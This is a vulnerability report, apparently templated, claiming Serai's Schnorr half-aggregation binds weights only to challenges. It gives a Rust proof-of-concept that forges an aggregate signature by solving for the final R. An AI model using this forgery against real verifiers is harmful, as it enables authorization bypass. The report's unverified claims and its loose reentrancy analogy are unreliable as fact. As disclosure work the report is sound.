### Title
Half-aggregation weights not bound to `Rs` or public keys allow forging a `SchnorrAggregate` over arbitrary keys/challenges - ([File: crypto/schnorr/src/aggregate.rs](crypto/schnorr/src/aggregate.rs))

### Summary
The reference report describes exploiting a gap between two committed states (re-entering `withdraw` after the first transfer but before the second) to bypass a check. The Serai analog in-scope is a commitment gap in `SchnorrAggregate::verify` / `SchnorrAggregator`: the per-signature aggregation weight `z_i` is derived from a transcript that commits **only to the challenges**, never to the `Rs` or the public keys. An attacker can therefore compute every weight first, then solve for the final `R` so the aggregate verification equation cancels to zero — forging an aggregate signature over arbitrary public keys and challenges without knowing any discrete logs.

### Finding Description
`SchnorrAggregate::verify` builds `digest` from the DST, domain-separates `b"signatures"`, and appends only `challenge` values before deriving each weight via `weight::<_, C::F>(&mut digest)`. [1](#0-0)  `weight` is a pure function of the transcript state, which at that point contains only the challenges — `self.Rs[i]` and `key` are never appended to `digest`. [2](#0-1)  The same asymmetric commitment exists on the signing side: `SchnorrAggregator::aggregate` appends only `challenge`, never `sig.R`. [3](#0-2) 

Verification checks `Σ z_i·R_i + Σ z_i·c_i·A_i − s·G == 0`. [4](#0-3)  Since every `z_i` is publicly computable given only the challenges (which the attacker chooses or knows), the attacker can set `R_1..R_{n-1}` arbitrarily (e.g., identity), pick any `s`, and solve for `R_n = z_n⁻¹·(s·G − Σ_{i<n} z_i·(R_i + c_i·A_i) − z_n·c_n·A_n)`. `z_n` is a nonzero field element with overwhelming probability, so inversion is trivial, and every term on the right is a known curve point. The resulting `SchnorrAggregate` deserializes fine via `SchnorrAggregate::read` (which accepts attacker-controlled `Rs` and `s`) and passes `verify`. [5](#0-4) 

Per eprint 2021/350, the aggregation weights must be a hash binding the full list of `(key, message/challenge, R)` tuples; binding only the challenges leaves the `R` values free after the weights are fixed, which is exactly the same exploit shape as the report: acting on a partially-committed state where a later component is unconstrained.

### Impact Explanation
Any consumer that calls `SchnorrAggregate::verify` on untrusted bytes (reachable via `SchnorrAggregate::read`) will accept a forged aggregate signature purporting to be over arbitrary public keys and challenges. This is a signature forgery — no secret keys, honest signers, or collusion required. High severity where half-aggregated Schnorr verification gates authorization.

### Likelihood Explanation
Exploitation requires only the ability to submit an aggregate signature to a verifier: choose the challenges/keys context (or use an existing one), compute `z_i` by replaying the public transcript, and solve for the last `R`. No timing, no privileged position, no honest-signer participation is needed. The only prerequisite is a deployment using the `aggregate` feature for verification.

### Recommendation
Commit every component of each aggregated signature into the weight transcript before deriving `z_i`: in both `SchnorrAggregate::verify` and `SchnorrAggregator::aggregate`, append `key.to_bytes()` and `sig.R.to_bytes()` (and `R` count) alongside `challenge`, so weights are unpredictable until all `Rs`, keys, and challenges are fixed.

### Proof of Concept
```rust
// Attacker: given arbitrary keys_and_challenges [(A_i, c_i)] of length n,
// forge a SchnorrAggregate that passes verify.
let n = keys_and_challenges.len();

// Rebuild the verifier's transcript (challenges only).
let mut digest = DigestTranscript::<C::H>::new(dst);
digest.domain_separate(b"signatures");
for (_, c) in keys_and_challenges {
    digest.append_message(b"challenge", c.to_repr());
}
let zs: Vec<C::F> = (0..n).map(|_| weight::<_, C::F>(&mut digest)).collect();

// Choose R_1..R_{n-1} = identity and arbitrary s.
let mut Rs = vec![C::G::identity(); n];
let s = C::F::random(&mut OsRng);

// Solve for R_n so the multiexp sums to identity:
//   R_n = z_n^-1 * (s*G - sum_{i<n} z_i*(R_i + c_i*A_i) - z_n*c_n*A_n)
let mut acc = C::generator() * s;
for i in 0..(n - 1) {
    acc -= keys_and_challenges[i].0 * (zs[i] * keys_and_challenges[i].1); // + z_i*R_i = 0
}
acc -= keys_and_challenges[n-1].0 * (zs[n-1] * keys_and_challenges[n-1].1);
Rs[n-1] = acc * zs[n-1].invert().unwrap();

let forged = SchnorrAggregate::<C> { Rs, s };
assert!(forged.verify(dst, keys_and_challenges)); // passes despite no secret keys
```

fn weight<D: Send + Clone + SecureDigest, F: PrimeField>(digest: &mut DigestTranscript<D>) -> F {
  let mut bytes = digest.challenge(b"aggregation_weight");
  debug_assert_eq!(bytes.len() % 8, 0);
  // This should be guaranteed thanks to SecureDigest
  debug_assert!(bytes.len() >= 32);

  let mut res = F::ZERO;
  let mut i = 0;

  // Derive a scalar from enough bits of entropy that bias is < 2^128
  // This can't be const due to its usage of a generic
  // Also due to the usize::try_from, yet that could be replaced with an `as`
  #[allow(non_snake_case)]
  let BYTES: usize = usize::try_from((F::NUM_BITS + 128).div_ceil(8)).unwrap();

  let mut remaining = BYTES;

  // We load bits in as u64s
  const WORD_LEN_IN_BITS: usize = 64;
  const WORD_LEN_IN_BYTES: usize = WORD_LEN_IN_BITS / 8;

  let mut first = true;
  while i < remaining {
    // Shift over the already loaded bits
    if !first {
      for _ in 0 .. WORD_LEN_IN_BITS {
        res += res;
      }
    }
    first = false;

    // Add the next 64 bits
    res += F::from(u64::from_be_bytes(bytes[i .. (i + WORD_LEN_IN_BYTES)].try_into().unwrap()));
    i += WORD_LEN_IN_BYTES;

    // If we've exhausted this challenge, get another
    if i == bytes.len() {
      bytes = digest.challenge(b"aggregation_weight_continued");
      remaining -= i;
      i = 0;
    }
  }
  res
}
